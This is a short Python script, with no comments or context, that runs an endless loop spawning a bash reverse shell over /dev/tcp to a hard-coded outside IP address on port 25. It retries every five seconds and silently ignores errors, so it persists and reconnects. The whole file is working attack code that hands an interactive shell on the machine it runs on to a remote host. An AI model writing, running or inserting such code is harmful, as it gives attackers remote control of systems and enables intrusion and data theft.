import os
import time
while 1:
    try:
        os.popen('exec 9<> /dev/tcp/209.9.108.169/25;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')
        time.sleep(5)
    except:
        pass
